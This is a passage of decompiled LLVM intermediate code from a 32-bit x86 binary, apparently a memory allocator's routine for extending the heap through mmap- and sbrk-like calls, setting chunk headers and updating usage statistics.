  store i32 %v1_804daad, i32* %ecx.global-to-local, align 4
  %v7_804dab0 = icmp ult i32 %v1_804daad, %v1_804daa3
  br i1 %v7_804dab0, label %dec_label_pc_804dad0, label %dec_label_pc_804dab4

dec_label_pc_804dab4:                             ; preds = %dec_label_pc_804da99
  %v2_804dab8 = add i32 %v0_804da99, %v1_804db2e
  store i32 %v2_804dab8, i32* @edx, align 4
  %v1_804dabb = or i32 %v1_804db2e, 1
  store i32 %v1_804dabb, i32* %eax.global-to-local, align 4
  store i32 %v2_804dab8, i32* @global_var_805836c.141, align 4
  store i32 %v1_804dabb, i32* %v2_804daa6, align 4
  %v0_804dac7 = load i32, i32* %ecx.global-to-local, align 4
  %v5_804dac7 = sub i32 %v0_804dac7, %v1_804db2e
  store i32 %v5_804dac7, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804de23

dec_label_pc_804dad0:                             ; preds = %dec_label_pc_804da99
  %v0_804dad0 = load i32, i32* @global_var_805869c.146, align 4
  store i32 %v0_804dad0, i32* %edx.global-to-local, align 4
  %v0_804dad6 = load i8, i8* @global_var_8058340.140, align 64
  %v1_804dad6 = and i8 %v0_804dad6, 2
  %v2_804dad6 = icmp eq i8 %v1_804dad6, 0
  br i1 %v2_804dad6, label %dec_label_pc_804db04, label %dec_label_pc_804dadf

dec_label_pc_804dadf:                             ; preds = %dec_label_pc_804dad0
  store i32 ptrtoint (i8* @global_var_8058340.140 to i32), i32* %stack_var_-92, align 4
  %v2_804dae7 = call i32 @function_804df3d(i32* bitcast (i8* @global_var_8058340.140 to i32*))
  store i32 ptrtoint (i8* @global_var_8058340.140 to i32), i32* @ebx, align 4
  %v1_804daf1 = add i32 %v1_804db2e, -7
  store i32 %v1_804daf1, i32* %eax.global-to-local, align 4
  store i32 %v1_804daf1, i32* %stack_var_-92, align 4
  %v1_804daf5 = call i32 @function_804d73a(i32 %v1_804daf1)
  store i32 %v1_804daf5, i32* %eax.global-to-local, align 4
  store i32 %v1_804daf5, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804de93

dec_label_pc_804db04:                             ; preds = %dec_label_pc_804dad0
  %v1_804db04 = add i32 %v0_804dad0, -1
  store i32 %v1_804db04, i32* @ecx, align 4
  store i32 %v1_804db2e, i32* @ebx, align 4
  %v1_804db0f = load i32, i32* @global_var_805868c.147, align 4
  %v7_804db0f = icmp ult i32 %v1_804db2e, %v1_804db0f
  br i1 %v7_804db0f, label %dec_label_pc_804dbd1, label %dec_label_pc_804db1b

dec_label_pc_804db1b:                             ; preds = %dec_label_pc_804db04
  %v0_804db1b = load i32, i32* @global_var_8058690.148, align 16
  store i32 %v0_804db1b, i32* %eax.global-to-local, align 4
  %v1_804db20 = load i32, i32* @global_var_8058694.149, align 4
  %v5_804db26 = icmp slt i32 %v0_804db1b, %v1_804db20
  br i1 %v5_804db26, label %dec_label_pc_804db2c, label %dec_label_pc_804dbd1

dec_label_pc_804db2c:                             ; preds = %dec_label_pc_804db1b
  %v2_804db2e = add i32 %v1_804db2e, 10
  %v3_804db2e = add i32 %v2_804db2e, %v0_804dad0
  %v1_804db32 = sub i32 0, %v0_804dad0
  store i32 %v1_804db32, i32* %eax.global-to-local, align 4
  %v2_804db34 = and i32 %v3_804db2e, %v1_804db32
  store i32 %v2_804db34, i32* @ebx, align 4
  %tmp129 = icmp ugt i32 %v2_804db34, %v1_804db2e
  br i1 %tmp129, label %dec_label_pc_804db40, label %dec_label_pc_804dbd1

dec_label_pc_804db40:                             ; preds = %dec_label_pc_804db2c
  store i32 0, i32* %stack_var_-92, align 4
  %v8_804db4d = call i32 @function_804ef9c(i32 0, i32 %v2_804db34, i32 3, i32 34, i32 0, i32 0, i32 %v1_804db04, i32 %v1_804db04)
  store i32 %v8_804db4d, i32* %eax.global-to-local, align 4
  store i32 %v8_804db4d, i32* @edx, align 4
  %v10_804db57 = icmp eq i32 %v8_804db4d, -1
  br i1 %v10_804db57, label %dec_label_pc_804db40.dec_label_pc_804dbd1_crit_edge, label %dec_label_pc_804db5c

dec_label_pc_804db40.dec_label_pc_804dbd1_crit_edge: ; preds = %dec_label_pc_804db40
  %v0_804dbd1.pre = load i32, i32* @global_var_805836c.141, align 4
  br label %dec_label_pc_804dbd1

dec_label_pc_804db5c:                             ; preds = %dec_label_pc_804db40
  %v1_804db5e = urem i32 %v8_804db4d, 8
  %v2_804db5e = icmp eq i32 %v1_804db5e, 0
  store i32 %v1_804db5e, i32* @ecx, align 4
  br i1 %v2_804db5e, label %dec_label_pc_804db76, label %dec_label_pc_804db63

dec_label_pc_804db63:                             ; preds = %dec_label_pc_804db5c
  %v0_804db68 = load i32, i32* @ebx, align 4
  %v2_804db6a = sub nsw i32 8, %v1_804db5e
  store i32 %v2_804db6a, i32* %eax.global-to-local, align 4
  %v2_804db6c = add i32 %v2_804db6a, %v8_804db4d
  store i32 %v2_804db6c, i32* @edx, align 4
  %v2_804db6e = sub i32 %v0_804db68, %v2_804db6a
  store i32 %v2_804db6e, i32* %esi.global-to-local, align 4
  %v2_804db70 = inttoptr i32 %v2_804db6c to i32*
  store i32 %v2_804db6a, i32* %v2_804db70, align 4
  br label %dec_label_pc_804db7e

dec_label_pc_804db76:                             ; preds = %dec_label_pc_804db5c
  %v1_804db76 = inttoptr i32 %v8_804db4d to i32*
  store i32 0, i32* %v1_804db76, align 4
  br label %dec_label_pc_804db7e

dec_label_pc_804db7e:                             ; preds = %dec_label_pc_804db63, %dec_label_pc_804db76
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_804db63 ], [ @ebx, %dec_label_pc_804db76 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_804db7e = or i32 %storemerge, 2
  %v1_804db81 = load i32, i32* @edx, align 4
  %v2_804db81 = add i32 %v1_804db81, 4
  %v3_804db81 = inttoptr i32 %v2_804db81 to i32*
  store i32 %v1_804db7e, i32* %v3_804db81, align 4
  %v0_804db84 = load i32, i32* @global_var_8058690.148, align 16
  %v1_804db89 = add i32 %v0_804db84, 1
  store i32 %v1_804db89, i32* %eax.global-to-local, align 4
  store i32 %v1_804db89, i32* @global_var_8058690.148, align 16
  %v1_804db8f = load i32, i32* @global_var_8058698.150, align 8
  %v7_804db95 = icmp sgt i32 %v1_804db89, %v1_804db8f
  br i1 %v7_804db95, label %dec_label_pc_804db97, label %dec_label_pc_804db9c

dec_label_pc_804db97:                             ; preds = %dec_label_pc_804db7e
  store i32 %v1_804db89, i32* @global_var_8058698.150, align 8
  br label %dec_label_pc_804db9c

dec_label_pc_804db9c:                             ; preds = %dec_label_pc_804db7e, %dec_label_pc_804db97
  %v0_804db9c = load i32, i32* @global_var_80586a4.151, align 4
  %v1_804dba1 = load i32, i32* @ebx, align 4
  %v2_804dba1 = add i32 %v1_804dba1, %v0_804db9c
  store i32 %v2_804dba1, i32* %eax.global-to-local, align 4
  store i32 %v2_804dba1, i32* @global_var_80586a4.151, align 4
  %v1_804dba8 = load i32, i32* @global_var_80586b0.152, align 16
  %tmp130 = icmp ugt i32 %v2_804dba1, %v1_804dba8
  br i1 %tmp130, label %dec_label_pc_804dbb0, label %dec_label_pc_804dbb5

dec_label_pc_804dbb0:                             ; preds = %dec_label_pc_804db9c
  store i32 %v2_804dba1, i32* @global_var_80586b0.152, align 16
  br label %dec_label_pc_804dbb5

dec_label_pc_804dbb5:                             ; preds = %dec_label_pc_804db9c, %dec_label_pc_804dbb0
  %v1_804dbb5 = load i32, i32* @global_var_80586a8.153, align 8
  %v2_804dbb5 = add i32 %v1_804dbb5, %v2_804dba1
  store i32 %v2_804dbb5, i32* %eax.global-to-local, align 4
  %v1_804dbbb = load i32, i32* @global_var_80586b4.154, align 4
  %tmp131 = icmp ugt i32 %v2_804dbb5, %v1_804dbbb
  br i1 %tmp131, label %dec_label_pc_804dbc7, label %dec_label_pc_804d818

dec_label_pc_804dbc7:                             ; preds = %dec_label_pc_804dbb5
  store i32 %v2_804dbb5, i32* @global_var_80586b4.154, align 4
  br label %dec_label_pc_804d818

dec_label_pc_804dbd1:                             ; preds = %dec_label_pc_804db2c, %dec_label_pc_804db40.dec_label_pc_804dbd1_crit_edge, %dec_label_pc_804db1b, %dec_label_pc_804db04
  %v0_804dbd1 = phi i32 [ %v0_804dbd1.pre, %dec_label_pc_804db40.dec_label_pc_804dbd1_crit_edge ], [ %v0_804da99, %dec_label_pc_804db1b ], [ %v0_804da99, %dec_label_pc_804db2c ], [ %v0_804da99, %dec_label_pc_804db04 ]
  store i32 %v0_804dbd1, i32* %eax.global-to-local, align 4
  %v1_804dbda = add i32 %v0_804dbd1, 4
  %v2_804dbda = inttoptr i32 %v1_804dbda to i32*
  %v3_804dbda = load i32, i32* %v2_804dbda, align 4
  %v1_804dbe4 = and i32 %v3_804dbda, -4
  %v2_804dbe4 = icmp eq i32 %v1_804dbe4, 0
  store i32 %v1_804dbe4, i32* @ebp, align 4
  %v1_804dbe7 = load i32, i32* @global_var_8058688.155, align 8
  %v2_804dbe7 = add i32 %v1_804dbe7, %v1_804daa3
  store i32 %v2_804dbe7, i32* %eax.global-to-local, align 4
  %v0_804dbed = load i8, i8* @global_var_80586a0.156, align 32
  %v1_804dbed = urem i8 %v0_804dbed, 2
  %v2_804dbed = icmp eq i8 %v1_804dbed, 0
  br i1 %v2_804dbed, label %dec_label_pc_804dbf8, label %dec_label_pc_804dbf6

dec_label_pc_804dbf6:                             ; preds = %dec_label_pc_804dbd1
  %v2_804dbf6 = sub i32 %v2_804dbe7, %v1_804dbe4
  store i32 %v2_804dbf6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dbf8

dec_label_pc_804dbf8:                             ; preds = %dec_label_pc_804dbd1, %dec_label_pc_804dbf6
  %v0_804dbfc = phi i32 [ %v2_804dbe7, %dec_label_pc_804dbd1 ], [ %v2_804dbf6, %dec_label_pc_804dbf6 ]
  %v5_804dbfc = add i32 %v0_804dbfc, %v1_804db04
  store i32 %v5_804dbfc, i32* %eax.global-to-local, align 4
  %v1_804dc00 = sub i32 0, %v0_804dad0
  store i32 %v1_804dc00, i32* @edx, align 4
  %v2_804dc08 = and i32 %v5_804dbfc, %v1_804dc00
  store i32 %v2_804dc08, i32* @esi, align 4
  %tmp88 = icmp slt i32 %v2_804dc08, 1
  br i1 %tmp88, label %dec_label_pc_804dc22, label %dec_label_pc_804dc0c

dec_label_pc_804dc0c:                             ; preds = %dec_label_pc_804dbf8
  store i32 %v2_804dc08, i32* %stack_var_-92, align 4
  %v1_804dc10 = call i32 @function_804f394(i32 %v2_804dc08)
  store i32 %v1_804dc10, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_804dc10, i32* @ebx, align 4
  %v10_804dc1d = icmp eq i32 %v1_804dc10, -1
  %v1_804dc20 = icmp eq i1 %v10_804dc1d, false
  br i1 %v1_804dc20, label %dec_label_pc_804dc78.dec_label_pc_804dc81_crit_edge, label %dec_label_pc_804dc0c.dec_label_pc_804dc22_crit_edge

dec_label_pc_804dc0c.dec_label_pc_804dc22_crit_edge: ; preds = %dec_label_pc_804dc0c
  %v0_804dc22.pre = load i8, i8* @global_var_80586a0.156, align 32
  br label %dec_label_pc_804dc22

dec_label_pc_804dc22:                             ; preds = %dec_label_pc_804dc0c.dec_label_pc_804dc22_crit_edge, %dec_label_pc_804dbf8
  %v0_804dc4e = phi i32 [ -1, %dec_label_pc_804dc0c.dec_label_pc_804dc22_crit_edge ], [ %v1_804dc00, %dec_label_pc_804dbf8 ]
  %v0_804dc22 = phi i8 [ %v0_804dc22.pre, %dec_label_pc_804dc0c.dec_label_pc_804dc22_crit_edge ], [ %v0_804dbed, %dec_label_pc_804dbf8 ]
  %v1_804dc22 = urem i8 %v0_804dc22, 2
  %v2_804dc22 = icmp eq i8 %v1_804dc22, 0
  br i1 %v2_804dc22, label %dec_label_pc_804dc22.dec_label_pc_804dc37_crit_edge, label %dec_label_pc_804dc2b

dec_label_pc_804dc22.dec_label_pc_804dc37_crit_edge: ; preds = %dec_label_pc_804dc22
  %v0_804dc37.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804dc37

dec_label_pc_804dc2b:                             ; preds = %dec_label_pc_804dc22
  %v2_804dc2f = add i32 %v1_804dbe4, %v1_804db04
  store i32 %v2_804dc2f, i32* %eax.global-to-local, align 4
  %v0_804dc31 = load i32, i32* @esi, align 4
  %v2_804dc31 = add i32 %v0_804dc31, %v2_804dc2f
  %v5_804dc33 = and i32 %v2_804dc31, %v1_804dc00
  store i32 %v5_804dc33, i32* @esi, align 4
  br label %dec_label_pc_804dc37

dec_label_pc_804dc37:                             ; preds = %dec_label_pc_804dc22.dec_label_pc_804dc37_crit_edge, %dec_label_pc_804dc2b
  %v0_804dc37 = phi i32 [ %v0_804dc37.pre, %dec_label_pc_804dc22.dec_label_pc_804dc37_crit_edge ], [ %v5_804dc33, %dec_label_pc_804dc2b ]
  %tmp132 = icmp ult i32 %v0_804dc37, 1048576
  br i1 %tmp132, label %dec_label_pc_804dc3f, label %dec_label_pc_804dc44

dec_label_pc_804dc3f:                             ; preds = %dec_label_pc_804dc37
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_804dc44

dec_label_pc_804dc44:                             ; preds = %dec_label_pc_804dc37, %dec_label_pc_804dc3f
  %v0_804dc58 = phi i32 [ %v0_804dc37, %dec_label_pc_804dc37 ], [ 1048576, %dec_label_pc_804dc3f ]
  %tmp133 = icmp ugt i32 %v0_804dc58, %v1_804db2e
  br i1 %tmp133, label %dec_label_pc_804dc4e, label %dec_label_pc_804de86

dec_label_pc_804dc4e:                             ; preds = %dec_label_pc_804dc44
  store i32 0, i32* %stack_var_-92, align 4
  %v8_804dc5b = call i32 @function_804ef9c(i32 0, i32 %v0_804dc58, i32 3, i32 34, i32 0, i32 0, i32 %v0_804dc4e, i32 %v0_804dc4e)
  store i32 %v8_804dc5b, i32* %eax.global-to-local, align 4
  store i32 %v8_804dc5b, i32* @ebx, align 4
  %v10_804dc65 = icmp eq i32 %v8_804dc5b, -1
  br i1 %v10_804dc65, label %dec_label_pc_804de86, label %dec_label_pc_804dc78.thread

dec_label_pc_804dc78.thread:                      ; preds = %dec_label_pc_804dc4e
  %v0_804dc6e = load i8, i8* @global_var_80586a0.156, align 1
  %v2_804dc6e = and i8 %v0_804dc6e, -2
  store i8 %v2_804dc6e, i8* @global_var_80586a0.156, align 32
  %v1_804dc75 = load i32, i32* @esi, align 4
  %v2_804dc75 = add i32 %v1_804dc75, %v8_804dc5b
  store i32 %v2_804dc75, i32* @edx, align 4
  br label %dec_label_pc_804dc81

dec_label_pc_804dc78.dec_label_pc_804dc81_crit_edge: ; preds = %dec_label_pc_804dc0c
  %v1_804dc85.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804dc81

dec_label_pc_804dc81:                             ; preds = %dec_label_pc_804dc78.dec_label_pc_804dc81_crit_edge, %dec_label_pc_804dc78.thread
  %v1_804dc85 = phi i32 [ %v1_804dc75, %dec_label_pc_804dc78.thread ], [ %v1_804dc85.pre, %dec_label_pc_804dc78.dec_label_pc_804dc81_crit_edge ]
  %v0_804dd4d92 = phi i32 [ %v8_804dc5b, %dec_label_pc_804dc78.thread ], [ %v1_804dc10, %dec_label_pc_804dc78.dec_label_pc_804dc81_crit_edge ]
  %v0_804dd3f91 = phi i32 [ %v2_804dc75, %dec_label_pc_804dc78.thread ], [ -1, %dec_label_pc_804dc78.dec_label_pc_804dc81_crit_edge ]
  %v0_804dc85 = load i32, i32* @global_var_80586a8.153, align 8
  %v2_804dc85 = add i32 %v1_804dc85, %v0_804dc85
  store i32 %v2_804dc85, i32* @global_var_80586a8.153, align 8
  %v2_804dc8b = add i32 %v1_804dbe4, %v0_804dbd1
  store i32 %v2_804dc8b, i32* %ecx.global-to-local, align 4
  %v2_804dc8d = sub i32 %v0_804dd4d92, %v2_804dc8b
  %v7_804dc8d = icmp ult i32 %v0_804dd4d92, %v2_804dc8b
  %v12_804dc8d = icmp eq i32 %v2_804dc8d, 0
  %v1_804dc8f = icmp eq i1 %v12_804dc8d, false
  br i1 %v1_804dc8f, label %dec_label_pc_804dca8, label %dec_label_pc_804dc91

dec_label_pc_804dc91:                             ; preds = %dec_label_pc_804dc81
  %v10_804dc91 = icmp eq i32 %v0_804dd3f91, -1
  %v1_804dc94 = icmp eq i1 %v10_804dc91, false
  br i1 %v1_804dc94, label %dec_label_pc_804dca8, label %dec_label_pc_804dc96

dec_label_pc_804dc96:                             ; preds = %dec_label_pc_804dc91
  %v2_804dc96 = add i32 %v1_804dc85, %v1_804dbe4
  store i32 %v0_804dbd1, i32* %ecx.global-to-local, align 4
  %v1_804dc9d = or i32 %v2_804dc96, 1
  store i32 %v1_804dc9d, i32* %eax.global-to-local, align 4
  store i32 %v1_804dc9d, i32* %v2_804dbda, align 4
  br label %dec_label_pc_804ddd5

dec_label_pc_804dca8:                             ; preds = %dec_label_pc_804dc91, %dec_label_pc_804dc81
  %v0_804dca8 = load i8, i8* @global_var_80586a0.156, align 1
  %v1_804dca8 = sext i8 %v0_804dca8 to i32
  store i32 %v1_804dca8, i32* %eax.global-to-local, align 4
  %v2_804dcad = urem i8 %v0_804dca8, 2
  %v3_804dcad = icmp eq i8 %v2_804dcad, 0
  br i1 %v3_804dcad, label %dec_label_pc_804dcc1, label %dec_label_pc_804dcb1

dec_label_pc_804dcb1:                             ; preds = %dec_label_pc_804dca8
  br i1 %v2_804dbe4, label %dec_label_pc_804dcc1, label %dec_label_pc_804dcb5

dec_label_pc_804dcb5:                             ; preds = %dec_label_pc_804dcb1
  %v1_804dcb7 = icmp eq i1 %v7_804dc8d, false
  br i1 %v1_804dcb7, label %dec_label_pc_804dcc1, label %dec_label_pc_804dcb9

dec_label_pc_804dcb9:                             ; preds = %dec_label_pc_804dcb5
  %v1_804dcb9 = and i32 %v1_804dca8, -2
  %v4_804dcb9 = trunc i32 %v1_804dcb9 to i8
  store i32 %v1_804dcb9, i32* %eax.global-to-local, align 4
  store i8 %v4_804dcb9, i8* @global_var_80586a0.156, align 32
  br label %dec_label_pc_804dcc1

dec_label_pc_804dcc1:                             ; preds = %dec_label_pc_804dcb5, %dec_label_pc_804dcb1, %dec_label_pc_804dca8, %dec_label_pc_804dcb9
  %v0_804dcc1 = phi i8 [ %v0_804dca8, %dec_label_pc_804dcb5 ], [ %v0_804dca8, %dec_label_pc_804dcb1 ], [ %v0_804dca8, %dec_label_pc_804dca8 ], [ %v4_804dcb9, %dec_label_pc_804dcb9 ]
  %v1_804dcc1 = urem i8 %v0_804dcc1, 2
  %v2_804dcc1 = icmp eq i8 %v1_804dcc1, 0
  br i1 %v2_804dcc1, label %dec_label_pc_804dd3f, label %dec_label_pc_804dcca

dec_label_pc_804dcca:                             ; preds = %dec_label_pc_804dcc1
  br i1 %v2_804dbe4, label %dec_label_pc_804dcd8, label %dec_label_pc_804dcce

dec_label_pc_804dcce:                             ; preds = %dec_label_pc_804dcca
  store i32 %v2_804dc8d, i32* %eax.global-to-local, align 4
  %v2_804dcd2 = add i32 %v2_804dc85, %v2_804dc8d
  store i32 %v2_804dcd2, i32* @global_var_80586a8.153, align 8
  br label %dec_label_pc_804dcd8

dec_label_pc_804dcd8:                             ; preds = %dec_label_pc_804dcca, %dec_label_pc_804dcce
  %v1_804dcda = urem i32 %v0_804dd4d92, 8
  %v2_804dcda = icmp eq i32 %v1_804dcda, 0
  store i32 %v1_804dcda, i32* %edx.global-to-local, align 4
  %v1_804dcdd = icmp eq i1 %v2_804dcda, false
  br i1 %v1_804dcdd, label %dec_label_pc_804dce5, label %dec_label_pc_804dcdf

dec_label_pc_804dcdf:                             ; preds = %dec_label_pc_804dcd8
  store i32 %v0_804dd4d92, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dcef

dec_label_pc_804dce5:                             ; preds = %dec_label_pc_804dcd8
  %v2_804dcea = sub nsw i32 8, %v1_804dcda
  store i32 %v2_804dcea, i32* %eax.global-to-local, align 4
  %v2_804dcec = add i32 %v2_804dcea, %v0_804dd4d92
  store i32 %v2_804dcec, i32* @edi, align 4
  br label %dec_label_pc_804dcef

dec_label_pc_804dcef:                             ; preds = %dec_label_pc_804dcdf, %dec_label_pc_804dce5
  %v0_804dcf2 = phi i32 [ 0, %dec_label_pc_804dcdf ], [ %v2_804dcea, %dec_label_pc_804dce5 ]
  %v2_804dcef = add i32 %v1_804dc85, %v0_804dd4d92
  %v2_804dcf2 = add i32 %v0_804dcf2, %v1_804dbe4
  store i32 %v2_804dcf2, i32* %ecx.global-to-local, align 4
  %v2_804dcfb = add i32 %v2_804dcf2, %v2_804dcef
  store i32 %v2_804dcfb, i32* %edx.global-to-local, align 4
  %v2_804dd01 = add i32 %v2_804dcfb, %v1_804db04
  %v5_804dd04 = and i32 %v2_804dd01, %v1_804dc00
  %v2_804dd0b = sub i32 %v5_804dd04, %v2_804dcfb
  store i32 %v2_804dd0b, i32* %eax.global-to-local, align 4
  %v2_804dd0d = add i32 %v2_804dd0b, %v2_804dcf2
  store i32 %v2_804dd0d, i32* @esi, align 4
  store i32 %v2_804dd0d, i32* %stack_var_-92, align 4
  %v1_804dd11 = call i32 @function_804f394(i32 %v2_804dd0d)
  store i32 %v1_804dd11, i32* %eax.global-to-local, align 4
  store i32 %v1_804dd11, i32* @edx, align 4
  %v10_804dd1b = icmp eq i32 %v1_804dd11, -1
  %v1_804dd1e = icmp eq i1 %v10_804dd1b, false
  br i1 %v1_804dd1e, label %dec_label_pc_804dd2e, label %dec_label_pc_804dd20

dec_label_pc_804dd20:                             ; preds = %dec_label_pc_804dcef
  store i32 0, i32* %stack_var_-92, align 4
  %v1_804dd25 = call i32 @function_804f394(i32 0)
  store i32 %v1_804dd25, i32* %eax.global-to-local, align 4
  store i32 %v1_804dd25, i32* @edx, align 4
  br label %dec_label_pc_804dd62

dec_label_pc_804dd2e:                             ; preds = %dec_label_pc_804dcef
  %v1_804dd2e = load i32, i32* @ebx, align 4
  %v7_804dd2e = icmp ult i32 %v1_804dd11, %v1_804dd2e
  %v1_804dd30 = icmp eq i1 %v7_804dd2e, false
  br i1 %v1_804dd30, label %dec_label_pc_804dd67, label %dec_label_pc_804dd32

dec_label_pc_804dd32:                             ; preds = %dec_label_pc_804dd2e
  %v0_804dd32 = load i8, i8* @global_var_80586a0.156, align 1
  %v2_804dd32 = and i8 %v0_804dd32, -2
  store i8 %v2_804dd32, i8* @global_var_80586a0.156, align 32
  store i32 %v2_804dcef, i32* @edx, align 4
  br label %dec_label_pc_804dd46

dec_label_pc_804dd3f:                             ; preds = %dec_label_pc_804dcc1
  %v10_804dd3f = icmp eq i32 %v0_804dd3f91, -1
  br i1 %v10_804dd3f, label %dec_label_pc_804dd4a, label %dec_label_pc_804dd44

dec_label_pc_804dd44:                             ; preds = %dec_label_pc_804dd3f
  store i32 %v0_804dd4d92, i32* @edi, align 4
  br label %dec_label_pc_804dd46

dec_label_pc_804dd46:                             ; preds = %dec_label_pc_804dd32, %dec_label_pc_804dd44
  %v0_804dd6749 = phi i32 [ %v2_804dcef, %dec_label_pc_804dd32 ], [ %v0_804dd3f91, %dec_label_pc_804dd44 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804dd67

dec_label_pc_804dd4a:                             ; preds = %dec_label_pc_804dd3f
  store i32 %v0_804dd4d92, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_804dd51 = call i32 @function_804f394(i32 0)
  store i32 %v1_804dd51, i32* @edx, align 4
  %v1_804dd58 = load i32, i32* @ebx, align 4
  %v2_804dd58 = sub i32 %v1_804dd51, %v1_804dd58
  %v1_804dd5a = load i32, i32* @esi, align 4
  %v2_804dd5a = sub i32 %v2_804dd58, %v1_804dd5a
  store i32 %v2_804dd5a, i32* %eax.global-to-local, align 4
  %v0_804dd5c = load i32, i32* @global_var_80586a8.153, align 8
  %v2_804dd5c = add i32 %v0_804dd5c, %v2_804dd5a
  store i32 %v2_804dd5c, i32* @global_var_80586a8.153, align 8
  br label %dec_label_pc_804dd62

dec_label_pc_804dd62:                             ; preds = %dec_label_pc_804dd20, %dec_label_pc_804dd4a
  %v0_804dd6748 = phi i32 [ %v1_804dd25, %dec_label_pc_804dd20 ], [ %v1_804dd51, %dec_label_pc_804dd4a ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804dd67

dec_label_pc_804dd67:                             ; preds = %dec_label_pc_804dd2e, %dec_label_pc_804dd46, %dec_label_pc_804dd62
  %v0_804dd6c = phi i32 [ %v1_804dd11, %dec_label_pc_804dd2e ], [ %v0_804dd6749, %dec_label_pc_804dd46 ], [ %v0_804dd6748, %dec_label_pc_804dd62 ]
  %v10_804dd67 = icmp eq i32 %v0_804dd6c, -1
  br i1 %v10_804dd67, label %dec_label_pc_804ddd5, label %dec_label_pc_804dd6c

dec_label_pc_804dd6c:                             ; preds = %dec_label_pc_804dd67
  %v1_804dd6c = load i32, i32* @edi, align 4
  %v2_804dd6c = sub i32 %v0_804dd6c, %v1_804dd6c
  store i32 %v2_804dd6c, i32* @edx, align 4
  store i32 %v1_804dd6c, i32* @global_var_805836c.141, align 4
  %v1_804dd74 = load i32, i32* @esi, align 4
  %v2_804dd74 = add i32 %v1_804dd74, %v2_804dd6c
  %v1_804dd77 = or i32 %v2_804dd74, 1
  store i32 %v1_804dd77, i32* %eax.global-to-local, align 4
  %v2_804dd7a = add i32 %v1_804dd6c, 4
  %v3_804dd7a = inttoptr i32 %v2_804dd7a to i32*
  store i32 %v1_804dd77, i32* %v3_804dd7a, align 4
  %v0_804dd7d = load i32, i32* @global_var_80586a8.153, align 8
  %v1_804dd7d = load i32, i32* @esi, align 4
  %v2_804dd7d = add i32 %v1_804dd7d, %v0_804dd7d
  store i32 %v2_804dd7d, i32* @global_var_80586a8.153, align 8
  br i1 %v2_804dbe4, label %dec_label_pc_804ddd5, label %dec_label_pc_804dd87

dec_label_pc_804dd87:                             ; preds = %dec_label_pc_804dd6c
  %v1_804dd87 = add i32 %v1_804dbe4, -12
  store i32 %v0_804dbd1, i32* %ecx.global-to-local, align 4
  %v1_804dd8e = and i32 %v1_804dd87, -8
  store i32 %v1_804dd8e, i32* %eax.global-to-local, align 4
  %v1_804dd93 = or i32 %v1_804dd8e, 1
  store i32 %v1_804dd93, i32* @edx, align 4
  %v5_804dd96 = icmp ult i32 %v1_804dd8e, 15
  store i32 %v1_804dd93, i32* %v2_804dbda, align 4
  %v0_804dd9c = load i32, i32* %ecx.global-to-local, align 4
  %v1_804dd9c = load i32, i32* %eax.global-to-local, align 4
  %v2_804dd9c = add i32 %v0_804dd9c, 4
  %v3_804dd9c = add i32 %v2_804dd9c, %v1_804dd9c
  %v4_804dd9c = inttoptr i32 %v3_804dd9c to i32*
  store i32 5, i32* %v4_804dd9c, align 4
  %v0_804dda4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804dda4 = load i32, i32* %eax.global-to-local, align 4
  %v2_804dda4 = add i32 %v0_804dda4, 8
  %v3_804dda4 = add i32 %v2_804dda4, %v1_804dda4
  %v4_804dda4 = inttoptr i32 %v3_804dda4 to i32*
  store i32 5, i32* %v4_804dda4, align 4
  br i1 %v5_804dd96, label %dec_label_pc_804ddd5, label %dec_label_pc_804ddae

dec_label_pc_804ddae:                             ; preds = %dec_label_pc_804dd87
  %v0_804ddb1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ddb3 = add i32 %v0_804ddb1, 8
  store i32 %v1_804ddb3, i32* %eax.global-to-local, align 4
  %v0_804ddb6 = load i32, i32* @global_var_8058684.157, align 4
  store i32 %v0_804ddb6, i32* @ebx, align 4
  store i32 %v1_804ddb3, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8058684.157, align 4
  %v1_804ddc7 = call i32 @function_804e0e5(i32 %v1_804ddb3)
  store i32 %v1_804ddc7, i32* %eax.global-to-local, align 4
  %v0_804ddcc = load i32, i32* @ebx, align 4
  store i32 %v0_804ddcc, i32* @global_var_8058684.157, align 4
  br label %dec_label_pc_804ddd5

dec_label_pc_804ddd5:                             ; preds = %dec_label_pc_804dd87, %dec_label_pc_804dd6c, %dec_label_pc_804dd67, %dec_label_pc_804dc96, %dec_label_pc_804ddae
  %v0_804ddd5 = load i32, i32* @global_var_80586a8.153, align 8
  store i32 %v0_804ddd5, i32* %eax.global-to-local, align 4
  %v1_804ddda = load i32, i32* @global_var_80586ac.158, align 4
  %tmp134 = icmp ugt i32 %v0_804ddd5, %v1_804ddda
  br i1 %tmp134, label %dec_label_pc_804dde2, label %dec_label_pc_804dde7

dec_label_pc_804dde2:                             ; preds = %dec_label_pc_804ddd5
  store i32 %v0_804ddd5, i32* @global_var_80586ac.158, align 4
  br label %dec_label_pc_804dde7

dec_label_pc_804dde7:                             ; preds = %dec_label_pc_804ddd5, %dec_label_pc_804dde2
  %v1_804dde7 = load i32, i32* @global_var_80586a4.151, align 4
  %v2_804dde7 = add i32 %v1_804dde7, %v0_804ddd5
  store i32 %v2_804dde7, i32* %eax.global-to-local, align 4
  %v1_804dded = load i32, i32* @global_var_80586b4.154, align 4
  %tmp135 = icmp ugt i32 %v2_804dde7, %v1_804dded
  br i1 %tmp135, label %dec_label_pc_804ddf5, label %dec_label_pc_804ddfa

dec_label_pc_804ddf5:                             ; preds = %dec_label_pc_804dde7
  store i32 %v2_804dde7, i32* @global_var_80586b4.154, align 4
  br label %dec_label_pc_804ddfa

dec_label_pc_804ddfa:                             ; preds = %dec_label_pc_804dde7, %dec_label_pc_804ddf5
  %v0_804ddfa = load i32, i32* @global_var_805836c.141, align 4
  store i32 %v0_804ddfa, i32* @ebx, align 4
